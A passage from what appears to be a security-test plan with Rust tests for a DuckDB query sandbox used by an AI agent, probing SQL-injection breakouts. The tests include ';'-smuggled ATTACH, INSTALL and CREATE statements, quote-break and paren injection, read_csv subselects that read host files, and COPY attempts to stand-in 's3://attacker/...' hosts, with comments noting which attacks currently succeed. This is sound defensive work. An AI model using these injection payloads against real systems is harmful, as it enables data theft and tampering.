        let dir = tmp_dir("wddl-attach"); let p = sales_parquet(&dir); let mut s = Session::new("wddl-attach").unwrap(); let r = s.run_code(&format!("query({p:?}, {:?})", "SELECT * FROM data; ATTACH ':memory:' AS evildb")); let _ = std::fs::remove_dir_all(&dir);
        assert!(r.is_err(), "BREAKOUT: smuggled ATTACH via ';' must be rejected"); // CURRENTLY FAILS: empirically confirmed at engine level eng.local_sql("SELECT * FROM data; ATTACH ':memory:' AS evildb", ...) returned Ok. ATTACH of a real .db file path is also a route to read/write arbitrary DB files.
    }

    /// `PROBE` — INSTALL is the extension-loading gadget; reaching it via ';' proves the wrapper's 'no extension loading' claim is structurally bypassable even though a second latch (disabled_filesystems) currently saves egress.
    /// seam: engine_duckdb.rs new_view execute_batch; 2nd statement INSTALL bypasses the single-SELECT view-body assumption (statement-shape containment), even though egress stays blocked by a separate latch.
    #[test]
    fn multistatement_install_extension_runs() {
        let dir = tmp_dir("wddl-install"); let p = sales_parquet(&dir); let mut s = Session::new("wddl-install").unwrap(); let r = s.run_code(&format!("query({p:?}, {:?})", "SELECT * FROM data; INSTALL httpfs")); let _ = std::fs::remove_dir_all(&dir);
        assert!(r.is_err(), "BREAKOUT: smuggled INSTALL via ';' must be rejected so extension loading stays structurally impossible"); // CURRENTLY FAILS: empirically eng.local_sql with trailing '; INSTALL httpfs' returned Ok. Egress is still separately blocked by disabled_filesystems, so this is statement-shape bypass, not (yet) egress.
    }

    /// `HOLDS` — Pins WHY this specific re-enable-network attempt is contained — a different defense layer (running-db latch) than the wrapper — so a regression removing the latch is caught even though the wrapper is already known-bypassable.
    /// seam: engine_duckdb.rs new_view execute_batch reaches the engine with a 2nd SET statement; DuckDB's running-db latch — NOT the wrapper — rejects enable_external_access.
    #[test]
    fn multistatement_set_extaccess_blocked_by_runtime_latch() {
        let dir = tmp_dir("wddl-setext"); let p = sales_parquet(&dir); let mut s = Session::new("wddl-setext").unwrap(); let r = s.run_code(&format!("query({p:?}, {:?})", "SELECT * FROM data; SET enable_external_access=true")); let _ = std::fs::remove_dir_all(&dir);
        assert!(r.is_err(), "SET enable_external_access=true must fail (DuckDB rejects it on a running db)"); // VERIFIED this session: Err 'Invalid Input Error: Cannot enable external access while database is running'. This HOLDS by a DuckDB runtime latch, not by the CREATE VIEW wrapper; the ';' breakout DID reach the engine and was rejected there.
    }

    /// `HOLDS` — Distinct gadget: directly target the disabled_filesystems latch (the actual egress guard) rather than enable_external_access; confirms the one-way latch is the real backstop behind the bypassable wrapper.
    /// seam: engine_duckdb.rs new_view execute_batch reaches the engine with `SET disabled_filesystems=''`; DuckDB's one-way disabled-filesystem latch rejects un-disabling on a running db.
    #[test]
    fn multistatement_set_disabled_filesystems_empty_blocked() {
        let dir = tmp_dir("wddl-cleardfs"); let p = sales_parquet(&dir); let mut s = Session::new("wddl-cleardfs").unwrap(); let r = s.run_code(&format!("query({p:?}, {:?})", "SELECT * FROM data; SET disabled_filesystems=''")); let _ = std::fs::remove_dir_all(&dir);
        assert!(r.is_err(), "clearing disabled_filesystems must fail — DuckDB rejects un-disabling a filesystem on a running db (one-way latch)"); // VERIFIED this session: Err 'Invalid Input Error: File system \"S3FileSystem\" has been disabled previously, it cannot be re-enabled'. The ';' breakout reaches the engine but the one-way latch keeps network FS off.
    }

    /// `HOLDS` — Classic SQLi paren-balance breakout — distinct from the ';' multi-statement angle because here statement #1 itself is corrupted by the unbalanced ')', so the WHOLE batch fails to parse and nothing (not even stmt #1) runs.
    /// seam: engine_duckdb.rs local_sql wraps as `WITH data AS (SELECT * FROM ds_0) <sql>` then `CREATE VIEW ds_n AS <that>`; agent injects ')' to try to close the wrapper and append a write.
    #[test]
    fn paren_injection_close_view_then_copy_is_parser_rejected() {
        let dir = tmp_dir("wddl-paren"); let p = sales_parquet(&dir); let leak = dir.join("paren_leak.csv"); let mut s = Session::new("wddl-paren").unwrap(); let sql = format!("SELECT * FROM data) ; COPY (SELECT 1) TO '{}' --", leak.to_str().unwrap()); let r = s.run_code(&format!("query({p:?}, {sql:?})")); let wrote = leak.exists(); let _ = std::fs::remove_dir_all(&dir);
        assert!(r.is_err(), "a stray ')' to break out of the wrapper must be a parser error"); assert!(!wrote, "paren-injection COPY must not write a file"); // VERIFIED this session: 'Parser Error: syntax error at or near \")\"' on `... WITH data AS (...) SELECT * FROM data) ; COPY ...`; no file written.
    }

    /// `PROBE` — Comment-obfuscation variant of the ';' breakout — verifies comment tricks neither help nor hinder, and that a block comment immediately before ';' still smuggles a write. Distinct gadget framing (obfuscation) from the bare ';' COPY/CTAS.
    /// seam: engine_duckdb.rs new_view execute_batch; a block comment before ';' does not change the statement boundary — the ';' still starts a real 2nd statement (CREATE TABLE).
    #[test]
    fn comment_then_semicolon_smuggles_second_statement() {
        let dir = tmp_dir("wddl-comment"); let p = sales_parquet(&dir); let mut s = Session::new("wddl-comment").unwrap(); let r = s.run_code(&format!("query({p:?}, {:?})", "SELECT * FROM data /* hide */ ; CREATE TABLE evil2 AS SELECT 1")); let leaked = s.run_code(&format!("query({p:?}, {:?})", "SELECT count(*) AS c FROM evil2")); let _ = std::fs::remove_dir_all(&dir);
        assert!(r.is_err() && leaked.is_err(), "a comment + ';' must not let a 2nd statement (CREATE TABLE) execute"); // CURRENTLY FAILS: empirically '/* hide */ ; CREATE TABLE ...' executes the CREATE TABLE (engine probe returned Ok). The comment is irrelevant; the ';' is the seam.
    }

    /// `HOLDS` — Single-statement COPY-TO-s3 — the canonical exfil-write; confirms the view-body shape guard rejects it when NOT smuggled behind a ';'. Distinct from the multistatement COPY angle (no ';').
    /// seam: query() -> local_sql -> `CREATE VIEW ds_n AS WITH data AS (...) <COPY...>`; COPY is not a SELECT so it cannot be a view body.
    #[test]
    fn single_copy_to_s3_as_view_body_is_parser_rejected() {
        let dir = tmp_dir("wddl-copys3"); let p = sales_parquet(&dir); let mut s = Session::new("wddl-copys3").unwrap(); let r = s.run_code(&format!("query({p:?}, {:?})", "COPY data TO 's3://nope/out.parquet'")); let _ = std::fs::remove_dir_all(&dir);
        assert!(r.is_err(), "a bare COPY TO as the agent SQL must be a parser error (COPY is not a valid CREATE VIEW body)"); // VERIFIED this session: bare COPY TO -> Err. (Even if it parsed, S3 FS is disabled.)
    }

    /// `HOLDS` — Extension-loading via a single (un-smuggled) statement — homogeneous mini-family of 3 distinct extension verbs proving the view-body guard rejects each. Complements the ';'-smuggled INSTALL PROBE.
    /// seam: query() -> `CREATE VIEW ds_n AS WITH data AS (...) <INSTALL|LOAD>`; non-SELECT body.
    #[test]
    fn single_install_load_as_view_body_is_parser_rejected() {
        let dir = tmp_dir("wddl-installbare"); let p = sales_parquet(&dir); let cases = ["INSTALL httpfs", "LOAD httpfs", "INSTALL spatial"]; let mut errs = true; for c in cases { let mut s = Session::new("wddl-installbare").unwrap(); errs &= s.run_code(&format!("query({p:?}, {c:?})")).is_err(); } let _ = std::fs::remove_dir_all(&dir);
        assert!(errs, "bare INSTALL/LOAD as the agent SQL must each be a parser error"); // VERIFIED this session: INSTALL httpfs / LOAD httpfs each -> Err as a view body. (INSTALL spatial follows the same non-SELECT shape.)
    }

    /// `HOLDS` — Homogeneous family of single non-SELECT statement-shapes; each a distinct DML/DDL verb the wrapper rejects as a view body. Proves the BARE forms are contained, complementing the multistatement breakouts.
    /// seam: query() -> `CREATE VIEW ds_n AS WITH data AS (...) <PRAGMA|SET|ATTACH|EXPORT|INSERT|DELETE|UPDATE|CALL>`; non-SELECT statement bodies.
    #[test]
    fn single_pragma_set_attach_export_dml_as_view_body_rejected() {
        let dir = tmp_dir("wddl-stmts"); let p = sales_parquet(&dir); let cases = ["PRAGMA database_list", "SET enable_external_access=true", "ATTACH 'x.db' AS y", "EXPORT DATABASE '/tmp/exp'", "INSERT INTO data VALUES (1)", "DELETE FROM data", "UPDATE data SET amt=2", "CALL pragma_version()"]; let mut all_err = true; for c in cases { let mut s = Session::new("wddl-stmts").unwrap(); all_err &= s.run_code(&format!("query({p:?}, {c:?})")).is_err(); } let _ = std::fs::remove_dir_all(&dir);
        assert!(all_err, "every non-SELECT statement (PRAGMA/SET/ATTACH/EXPORT DATABASE/INSERT/DELETE/UPDATE/CALL) must be a parser error as a view body"); // VERIFIED this session: each of the 8 bare statements -> Err when run as a query() view body.
    }

    /// `HOLDS` — CTE-prefix collision: a structurally different breakout attempt — abusing the host-prepended WITH to chain a second WITH to redefine `data` or smuggle structure — distinct from ';' and ')' injection.
    /// seam: engine_duckdb.rs local_sql prepends `WITH data AS (...)`; agent SQL that itself starts with WITH yields an illegal `WITH data AS(...) WITH t AS(...)`.
    #[test]
    fn agent_leading_with_clause_double_with_is_rejected() {
        let dir = tmp_dir("wddl-doublewith"); let p = sales_parquet(&dir); let mut s = Session::new("wddl-doublewith").unwrap(); let r = s.run_code(&format!("query({p:?}, {:?})", "WITH t AS (SELECT 1) SELECT * FROM t")); let _ = std::fs::remove_dir_all(&dir);
        assert!(r.is_err(), "agent SQL beginning with its own WITH must error (the prepended 'WITH data AS(...)' makes a double-WITH that DuckDB rejects)"); // VERIFIED this session: 'CREATE VIEW ds_n AS WITH data AS (...) WITH t AS (...) ...' -> 'Parser Error: syntax error at or near \"WITH\"'.
    }

    /// `HOLDS` — Handle-poisoning gadget: redefine an existing ds_n view another handle points at (cross-handle data-integrity confusion). Tests the ')'-balanced form, which is rejected.
    /// seam: engine_duckdb.rs new_view `CREATE VIEW ds_n AS <sql>`; agent tries ')' + CREATE OR REPLACE VIEW ds_0 to poison an existing handle's view.
    #[test]
    fn create_or_replace_view_paren_injection_is_parser_rejected() {
        let dir = tmp_dir("wddl-corv"); let p = sales_parquet(&dir); let mut s = Session::new("wddl-corv").unwrap(); let r = s.run_code(&format!("query({p:?}, {:?})", "SELECT * FROM data); CREATE OR REPLACE VIEW ds_0 AS SELECT 9; --(SELECT 1")); let _ = std::fs::remove_dir_all(&dir);
        assert!(r.is_err(), "CREATE OR REPLACE VIEW handle-poison injection (')'-form) must be parser-rejected"); // VERIFIED this session: the leading ')' is unbalanced -> 'Parser Error: syntax error at or near \")\"'.
    }

    /// `PROBE` — Cross-handle data-integrity escalation: not a new file or table, but SILENT corruption of an existing opaque handle's contents — a distinct consequence-class from COPY (disk), CREATE TABLE (new namespace), ATTACH (catalog).
    /// seam: engine_duckdb.rs new_view execute_batch; a ';'-smuggled CREATE OR REPLACE VIEW ds_0 rewrites the view an EARLIER handle resolves to (handle-content poisoning / data integrity).
    #[test]
    fn create_or_replace_view_semicolon_poisons_existing_handle() {
        let dir = tmp_dir("wddl-corv-semi"); let p = sales_parquet(&dir); let mut s = Session::new("wddl-corv-semi").unwrap(); s.run_code(&format!("ds = register({p:?})")).unwrap(); /* ds is ds_0 */ let r = s.run_code("local_sql('SELECT 1 AS x; CREATE OR REPLACE VIEW ds_0 AS SELECT 99 AS region, 99.0 AS amt', [])"); let poisoned = s.run_code("to_rows(ds)"); let _ = std::fs::remove_dir_all(&dir);
        assert!(r.is_err(), "a ';'-smuggled CREATE OR REPLACE VIEW must be rejected, not silently rewrite an existing handle's view"); // CURRENTLY FAILS: the same execute_batch flaw runs the 2nd statement; CREATE OR REPLACE VIEW ds_0 mutates the view that the earlier `ds` handle resolves to, so a later to_rows(ds) returns the attacker's injected row(s) instead of the registered parquet. Demonstrates handle-content poisoning (integrity), distinct from on-disk write/CTAS/ATTACH.
    }

    /// `PROBE` — Boundary/anti-regression canary for the eventual single-statement fix: ensures the remediation distinguishes an empty trailing statement (benign) from a smuggled one (malicious). Distinct purpose from every breakout test.
    /// seam: engine_duckdb.rs new_view execute_batch; a harmless trailing ';' (empty 2nd statement) must NOT be conflated with a real 2nd statement when the single-statement fix lands.
    #[test]
    fn trailing_semicolon_only_is_benign_not_a_breakout() {
        let dir = tmp_dir("wddl-trailsemi"); let p = sales_parquet(&dir); let mut s = Session::new("wddl-trailsemi").unwrap(); let r = s.run_code(&format!("query({p:?}, {:?})", "SELECT * FROM data;")); let _ = std::fs::remove_dir_all(&dir);
        assert!(r.is_ok(), "a single SELECT with a harmless trailing ';' should still succeed"); // VERIFIED currently Ok this session. Documents the desired behavior of the future single-statement guard: it must allow a lone trailing ';' (empty 2nd statement) while rejecting a NON-empty 2nd statement. Guards the fix against over-rejecting legitimate SQL.
    }

    /// `HOLDS` — COPY FROM (the read/ingest direction of COPY, distinct from COPY TO) — confirms BOTH directions of COPY are rejected as bare view bodies; would only break out via the ';' seam.
    /// seam: query() CREATE VIEW body; `COPY ... FROM` ingests a host file into a table (write/ingest side of COPY) — non-SELECT body.
    #[test]
    fn copy_from_local_file_as_view_body_rejected() {
        let dir = tmp_dir("wddl-copyfrom"); let p = sales_parquet(&dir); let mut s = Session::new("wddl-copyfrom").unwrap(); let r = s.run_code(&format!("query({p:?}, {:?})", "COPY data FROM '/etc/hostname'")); let _ = std::fs::remove_dir_all(&dir);
        assert!(r.is_err(), "COPY ... FROM as the agent SQL must be a parser error (non-SELECT view body)"); // VERIFIED this session: bare COPY data FROM ... -> Err as a view body.
    }
```

- [ ] **Step 2: Run + triage**

Run: `RUST_MIN_STACK=16777216 cargo test -p droplet-core security::writes_ddl`
Expected: HOLDS green; triage PROBE/CANARY per the Probe protocol (PROBE red → finding ledger + convert to CANARY; CANARY red → gap closed, flip).

- [ ] **Step 3: Commit**

```bash
git add -A && git commit -m "test(security): writes_ddl adversarial angles (15 tests)"
```

---

## Task 6: SQL-fragment injection through host-built SQL (16 angles)

**Files:** Create `crates/droplet-core/src/security/sql_injection.rs`. **Reference seams:** the unsanitized `format!`-built fragments in `engine_duckdb.rs` (filter/group/with_column/sort/join/local_sql/register path).
**Interfaces — Consumes:** the Task 1 helper kit (dispatch/catch_dispatch/tmp_dir/sales_parquet).

- [ ] **Step 1: Write the class file (full code)**

```rust
// crates/droplet-core/src/security/sql_injection.rs
//! SQL-fragment injection through host-built SQL — adversarial angles. seam: the unsanitized `format!`-built fragments in `engine_duckdb.rs` (filter/group/with_column/sort/join/local_sql/register path).
#![allow(unused_imports)]
use monty::MontyObject;
use crate::DropletError;
use crate::session::Session;
use crate::engine_duckdb::{DuckEngine, Dataset, DEFAULT_MAX_RESULT_ROWS};
use crate::registry::Registry;
use crate::tool::{Tool, ToolCx};
use super::{dispatch, catch_dispatch, tmp_dir, sales_parquet, write_parquet, list_len};

    /// `PROBE` — Attacks execute_batch multi-statement semantics in new_view — the shared sink for every handle tool; a trailing `;` escapes the CREATE VIEW. Distinct from every fragment-shape angle.
    /// seam: engine_duckdb.rs new_view() execute_batch — filter_rows funnels WHERE {where_sql} through CREATE VIEW ds_n AS SELECT * FROM ds_k WHERE <frag>
    #[test]
    fn multistmt_injection_via_filter_executes_arbitrary_ddl() {
        let dir = tmp_dir("mstmt-ddl");
        let p = sales_parquet(&dir);
        let mut s = Session::new("mstmt-ddl").unwrap();
        // Register two views: ds_0 (victim) and ds_1. The injected `; DROP VIEW ds_0` rides the
        // filter_rows WHERE fragment; new_view's execute_batch runs BOTH statements.
        s.run_code(&format!("victim = register({p:?})")).unwrap();
        let h = s.run_code(&format!("register({p:?})")).unwrap();
        assert!(matches!(h, MontyObject::Int(_)));
        let r = s.run_code(&format!("filter_rows(register({p:?}), '1=1; DROP VIEW ds_0')"));
        let _ = std::fs::remove_dir_all(&dir);
        // SECURITY CONTRACT: a WHERE fragment must NOT be able to run a second DDL statement; the
        // CREATE VIEW wrap must contain it (parser must reject the `;`). Probe-confirmed today the
        // multi-statement batch SUCCEEDS (is_ok=true) and the injected DROP fires against ds_0.
        // The desired contract is r.is_err(); this assertion FAILS today => REAL FINDING: new_view
        // must use conn.execute() (single statement) or reject multi-statement SQL, not execute_batch.
        assert!(r.is_err(), "multi-statement injection via filter WHERE ran a second DDL (DROP) inside execute_batch; the CREATE VIEW wrap does not contain the fragment");
    }

    /// `PROBE` — Targets the SPECIFIC false claim that query() wraps in `CREATE VIEW ... AS (<sql>)`. The code omits the parens (local_sql builds `WITH data AS (...) <sql>`), so query() is a distinct write-escape seam from the bare handle-tool fragment splices.
    /// seam: tools.rs query() -> engine.local_sql(): CREATE VIEW ds_n AS WITH data AS (...) <agent_sql> (NO outer parens around agent sql)
    #[test]
    fn query_wrap_is_not_parenthesized_multistmt_copy_writes() {
        let dir = tmp_dir("query-mstmt");
        let p = sales_parquet(&dir);
        let leak = dir.join("query_leak.csv");
        let leak_s = leak.to_str().unwrap().to_string();
        let _ = std::fs::remove_file(&leak);
        let mut s = Session::new("query-mstmt").unwrap();
        // query()'s agent SQL is spliced as: CREATE VIEW ds_1 AS WITH data AS (SELECT * FROM ds_0) <sql>
        // A self-contained second statement (COPY of a literal SELECT) executes via execute_batch.
        let sql = format!("SELECT * FROM data; COPY (SELECT 1) TO '{leak_s}' (HEADER, DELIMITER ',')");
        let code = format!("query({p:?}, {sql:?})");
        let r = s.run_code(&code);
        let wrote = leak.exists();
        let _ = std::fs::remove_dir_all(&dir);
        let _ = r;
        // query() WRITE-BLOCK CONTRACT: a multi-statement COPY TO a local path must be rejected; the
        // CREATE VIEW wrap must actually contain the agent SQL (parenthesized subquery) so a trailing
        // `;` is a parser error. Probe-confirmed today the file IS written (wrote=true) and run_code
        // returns Ok. The required behavior is wrote==false; this FAILS today => REAL FINDING.
        assert!(!wrote, "query() executed a trailing COPY TO a host file via execute_batch; the threat-model claim that query wraps in CREATE VIEW ... AS (<sql>) is false (no parens), so query() is injectable");
    }

    /// `CANARY` — New exfil ANGLE on the accepted gap: reaches arbitrary file read through the filter_rows WHERE predicate (a subselect table function), distinct from query()'s top-level FROM read_csv canary already on file.
    /// seam: tools.rs filter_rows -> engine.filter_rows: SELECT * FROM ds WHERE {where_sql} — EXISTS subselect over read_csv
    #[test]
    fn filter_where_subselect_widens_local_read_canary() {
        let dir = tmp_dir("filter-read");
        let p = sales_parquet(&dir);
        let secret = dir.join("secret.csv");
        std::fs::write(&secret, "TOPSECRET\n").unwrap();
        let secret_s = secret.to_str().unwrap().to_string();
        let mut s = Session::new("filter-read").unwrap();
        // WHERE fragment carries an EXISTS subselect over read_csv of a host file the agent owns no handle to.
        let where_sql = format!("EXISTS (SELECT 1 FROM read_csv('{secret_s}', header=false))");
        let code = format!("to_rows(filter_rows(register({p:?}), {where_sql:?}))");
        let r = s.run_code(&code);
        let _ = std::fs::remove_dir_all(&dir);
        assert!(r.is_ok(), "KNOWN-GAP canary: a WHERE-fragment EXISTS subselect can read an arbitrary host file (read_csv) — the accepted V1a local-FS read gap reached through filter_rows. Flips to is_err() when V3 scopes local reads.");
    }

    /// `CANARY` — Distinct exfil ANGLE: the derived-column expression seam projects file bytes as a column value that actually crosses to_rows — different gadget from a WHERE filter or a top-level read_csv FROM.
    /// seam: tools.rs with_column -> engine.local_sql: SELECT *, {expr} AS {name} FROM base — expr is a scalar subquery reading a host file
    #[test]
    fn with_column_expr_subselect_exfiltrates_file_contents_canary() {
        let dir = tmp_dir("wc-read");
        let p = sales_parquet(&dir);
        let secret = dir.join("secret.txt");
        std::fs::write(&secret, "TOPSECRET").unwrap();
        let secret_s = secret.to_str().unwrap().to_string();
        let mut s = Session::new("wc-read").unwrap();
        // expr is a scalar subquery that reads the host file and projects its content as a new column,
        // which then crosses the boundary via to_rows -> the contents exfiltrate to the agent.
        let expr = format!("(SELECT min(column0) FROM read_csv('{secret_s}', header=false))");
        let code = format!("to_rows(with_column(register({p:?}), 'leaked', {expr:?}))");
        let out = s.run_code(&code).expect("KNOWN GAP: file read via with_column expr currently succeeds");
        let leaked = format!("{out:?}");
        let _ = std::fs::remove_dir_all(&dir);
        assert!(leaked.contains("TOPSECRET"), "KNOWN-GAP canary: with_column's expr fragment is a scalar subquery that reads + projects a host file's contents, exfiltrating them through to_rows. Flips when V3 scopes local FS.");
    }

    /// `CANARY` — Distinct exfil ANGLE through the aggregate-metric expression splice (the (alias, sql_expr) pair), separate from filter WHERE and with_column expr.
    /// seam: tools.rs group_agg -> engine.group_agg: SELECT {by}, {expr} AS {alias} ... GROUP BY {by} — metric expr is a file-reading scalar subquery
    #[test]
    fn group_agg_metric_subselect_reads_file_canary() {
        let dir = tmp_dir("gagg-read");
        let p = sales_parquet(&dir);
        let secret = dir.join("secret.csv");
        std::fs::write(&secret, "99\n").unwrap();
        let secret_s = secret.to_str().unwrap().to_string();
        let mut s = Session::new("gagg-read").unwrap();
        let metric_expr = format!("(SELECT CAST(min(column0) AS BIGINT) FROM read_csv('{secret_s}', header=false))");
        let code = format!("to_rows(group_agg(register({p:?}), ['region'], [('leaked', {metric_expr:?})]))");
        let out = s.run_code(&code).expect("KNOWN GAP: metric subquery file read currently succeeds");
        let leaked = format!("{out:?}");
        let _ = std::fs::remove_dir_all(&dir);
        assert!(leaked.contains("99"), "KNOWN-GAP canary: group_agg metric-expr fragment reads a host file via subquery and the value exfiltrates through to_rows. Flips when V3 scopes local FS.");
    }

    /// `CANARY` — Attacks the ALIAS splice (vs the expr splice) in group_agg — a structurally different injection point that widens the result shape rather than reading files.
    /// seam: engine_duckdb.rs group_agg: cols.push(format!("{expr} AS {alias}")) — alias is an unsanitized SQL fragment
    #[test]
    fn group_agg_metric_alias_injects_extra_projected_column() {
        let dir = tmp_dir("gagg-alias");
        let p = sales_parquet(&dir);
        let mut s = Session::new("gagg-alias").unwrap();
        // alias = "x, COUNT(*) AS smuggled" makes the SELECT list project an EXTRA agent-chosen column.
        let code = format!("to_rows(group_agg(register({p:?}), ['region'], [('x, COUNT(*) AS smuggled', 'SUM(amt)')]))");
        let out = s.run_code(&code).expect("alias injection currently parses");
        let _ = std::fs::remove_dir_all(&dir);
        let MontyObject::List(items) = out else { panic!("expected rows") };
        let MontyObject::Dict(pairs) = &items[0] else { panic!("expected dict row") };
        let has_smuggled = pairs.clone().into_iter().any(|(k,_)| k == MontyObject::String("smuggled".into()));
        assert!(has_smuggled, "KNOWN-GAP canary: an unsanitized metric ALIAS injects an extra projected column ('smuggled'), proving the alias position is a SQL-fragment splice, not an identifier. Local-only (no egress/write) => CANARY; flips when aliases are validated as bare identifiers.");
    }

    /// `CANARY` — Distinct splice point: the GROUP BY by-column list (appears twice in the built SQL), separate from the metric expr/alias angles. Demonstrates expression injection rather than file read or write.
    /// seam: engine_duckdb.rs group_agg: by.join(", ") appears in BOTH the SELECT prefix and GROUP BY {by} — by-cols unsanitized
    #[test]
    fn group_agg_by_col_injects_grouping_expression() {
        let dir = tmp_dir("gagg-by");
        let p = sales_parquet(&dir);
        let mut s = Session::new("gagg-by").unwrap();
        // by = ['region', 'amt > 100'] injects an arbitrary grouping EXPRESSION (a predicate) into SELECT + GROUP BY.
        let code = format!("to_rows(group_agg(register({p:?}), ['region', 'amt > 100'], [('n', 'COUNT(*)')]))");
        let r = s.run_code(&code);
        let _ = std::fs::remove_dir_all(&dir);
        assert!(r.is_ok(), "KNOWN-GAP canary: a by-col entry is spliced verbatim into SELECT + GROUP BY, so 'amt > 100' becomes a grouping EXPRESSION (not a column), confirming the by-col position is a raw SQL fragment. Local-only => CANARY; flips when by-cols are validated as identifiers.");
    }

    /// `CANARY` — Attacks the JOIN ON predicate splice with a LOGIC injection (semantics change to cross join) rather than a file read or statement break — a distinct effect class for the same surface.
    /// seam: tools.rs join -> engine.local_sql: SELECT * FROM l JOIN r ON {on} — logic injection
    #[test]
    fn join_on_true_widens_inner_join_to_cross_join() {
        let dir = tmp_dir("join-on");
        let p = sales_parquet(&dir);
        let mut s = Session::new("join-on").unwrap();
        // 'on' is spliced raw. ON 'true' turns the intended inner join into a CROSS JOIN (cartesian).
        let code = format!("to_rows(join(register({p:?}), register({p:?}), 'true'))");
        let r = s.run_code(&code);
        let _ = std::fs::remove_dir_all(&dir);
        assert!(r.is_ok(), "KNOWN-GAP canary: the join ON fragment is raw SQL, so 'ON true' silently widens the inner join into a cartesian product — operation-semantics injection. Local-only (result still capped, no egress/write) => CANARY; flips if join predicates are ever structured/validated.");
    }

    /// `CANARY` — Distinct from the ON-'true' logic angle: uses the ON splice as a vehicle for the local-FS read gap via a type-matched subselect — a different exploitation of the same seam.
    /// seam: tools.rs join -> engine.local_sql: SELECT * FROM l JOIN r ON {on} — read_csv subselect in ON
    #[test]
    fn join_on_subselect_reads_host_file_canary() {
        let dir = tmp_dir("join-read");
        let p = sales_parquet(&dir);
        let secret = dir.join("secret.csv");
        std::fs::write(&secret, "EU\n").unwrap();
        let secret_s = secret.to_str().unwrap().to_string();
        let mut s = Session::new("join-read").unwrap();
        // ON predicate carries a file read: l.region IN (SELECT column0 FROM read_csv('<secret>')).
        let on = format!("l.region IN (SELECT column0 FROM read_csv('{secret_s}', header=false))");
        let code = format!("to_rows(join(register({p:?}), register({p:?}), {on:?}))");
        let r = s.run_code(&code);
        let _ = std::fs::remove_dir_all(&dir);
        assert!(r.is_ok(), "KNOWN-GAP canary: the join ON fragment can host a read_csv subselect over an arbitrary host file (a VARCHAR column matches l.region, avoiding a type error). Confirms ON reaches the file-read gap. Flips when V3 scopes local FS.");
    }

    /// `CANARY` — Attacks the CTE-alias splice in local_sql — a structurally unique injection point (the alias becomes SQL between WITH and the body), distinct from every fragment/expr/predicate angle.
    /// seam: engine_duckdb.rs local_sql: format!("{alias} AS (SELECT * FROM {})") joined into WITH {ctes} {sql} — alias splice
    #[test]
    fn local_sql_alias_injects_second_cte() {
        let dir = tmp_dir("ls-alias");
        let p = sales_parquet(&dir);
        let mut s = Session::new("ls-alias").unwrap();
        // alias 'x AS (SELECT 42 AS a), evil' closes the generated CTE early and injects a second,
        // fully agent-controlled CTE 'evil'. The final sql then selects from it.
        let alias = "x AS (SELECT 42 AS a), evil";
        let code = format!("to_rows(local_sql('SELECT * FROM evil', [({alias:?}, register({p:?}))]))");
        let r = s.run_code(&code);
        let _ = std::fs::remove_dir_all(&dir);
        assert!(r.is_ok(), "KNOWN-GAP canary: the local_sql alias is spliced as raw SQL into the WITH clause, so it can close the generated CTE and inject a second agent-defined CTE. Local-only => CANARY; the engine's TODO(M2) flags validating aliases as bare identifiers. Flips when alias validation lands.");
    }

    /// `CANARY` — Attacks the FILENAME-string splice in read_parquet('{path}') — a different quoting context (inside a single-quoted SQL string literal) requiring a quote-break, unlike all the bare-fragment splices.
    /// seam: engine_duckdb.rs register_parquet: read_parquet('{path}') — TODO(M2) filename injection (single-quoted string-literal context)
    #[test]
    fn register_path_quote_break_unions_arbitrary_file_read_canary() {
        let dir = tmp_dir("reg-path");
        let p = sales_parquet(&dir);
        // A second parquet with the SAME schema (region VARCHAR, amt DOUBLE) to UNION in via the quote-break.
        let other = dir.join("other.parquet").to_str().unwrap().to_string();
        write_parquet(&other, "SELECT 'SMUGGLED' AS region, CAST(7.0 AS DOUBLE) AS amt");
        let mut s = Session::new("reg-path").unwrap();
        // path closes read_parquet('...'), UNIONs an arbitrary read_parquet, and comments out the trailing ').
        let evil = format!("{p}') UNION ALL SELECT * FROM read_parquet('{other}') --");
        let code = format!("to_rows(register({evil:?}))");
        let out = s.run_code(&code).expect("KNOWN GAP: path quote-break currently parses");
        let leaked = format!("{out:?}");
        let _ = std::fs::remove_dir_all(&dir);
        assert!(leaked.contains("SMUGGLED"), "KNOWN-GAP canary: register_parquet splices the path into read_parquet('{path}') with no escaping, so a quote-break UNIONs in an arbitrary file the agent chose, widening the local read. Engine TODO(M2) flags this filename injection. Flips when the path is bound as a parameter (V3 load boundary).");
    }

    /// `HOLDS` — The egress-via-injection counterpart to the file-read canary: proves the SAME injection that widens local read CANNOT widen to network egress — pins which half of the gap is contained.
    /// seam: engine_duckdb.rs register_parquet path splice vs invariant #3 (disabled_filesystems latch)
    #[test]
    fn register_path_quote_break_to_s3_still_blocks_egress() {
        let dir = tmp_dir("reg-egress");
        let p = sales_parquet(&dir);
        let mut s = Session::new("reg-egress").unwrap();
        // Same path quote-break, but the injected read targets s3:// — egress must be refused by the
        // disabled-filesystems latch, even though the injection itself parses.
        let evil = format!("{p}') UNION ALL SELECT * FROM read_parquet('s3://attacker/leak.parquet') --");
        let code = format!("to_rows(register({evil:?}))");
        let r = s.run_code(&code);
        let _ = std::fs::remove_dir_all(&dir);
        assert!(r.is_err(), "EGRESS CONTRACT HOLDS: even a successful filename injection cannot reach s3://; the disabled_filesystems one-way latch + no-autoload httpfs make read_parquet('s3://...') fail at the engine with no network round-trip.");
    }

    /// `HOLDS` — Pairs with the multi-statement WRITE finding to isolate the blast radius: the same multi-statement gadget that writes a local file is still walled off from network egress — a distinct contract (egress) on the same gadget.
    /// seam: engine_duckdb.rs new_view execute_batch multi-statement vs invariant #3 egress latch
    #[test]
    fn multistmt_injection_cannot_egress_to_s3_holds() {
        let dir = tmp_dir("mstmt-egress");
        let p = sales_parquet(&dir);
        let mut s = Session::new("mstmt-egress").unwrap();
        // Multi-statement injection that tries to COPY out to s3 — must be refused by the disabled-filesystems latch.
        let sql = "SELECT * FROM data; COPY (SELECT 1) TO 's3://attacker/leak.csv'";
        let code = format!("query({p:?}, {sql:?})");
        let r = s.run_code(&code);
        let _ = std::fs::remove_dir_all(&dir);
        assert!(r.is_err(), "EGRESS CONTRACT HOLDS: even with the multi-statement COPY-write bypass, COPY ... TO 's3://...' is refused by the disabled_filesystems latch (no httpfs autoload). The injection can write LOCAL files but cannot reach the network.");
    }

    /// `CANARY` — Attacks the ORDER BY splice specifically — a distinct clause from WHERE/SELECT/GROUP BY/ON, accepting subquery/expression fragments where a column list is the intended contract.
    /// seam: tools.rs sort -> engine.local_sql: SELECT * FROM base ORDER BY {by}
    #[test]
    fn sort_orderby_subselect_fragment_executes() {
        let dir = tmp_dir("sort-inj");
        let p = sales_parquet(&dir);
        let mut s = Session::new("sort-inj").unwrap();
        // 'by' is raw SQL after ORDER BY. A scalar subquery is accepted, proving the order list is an arbitrary fragment.
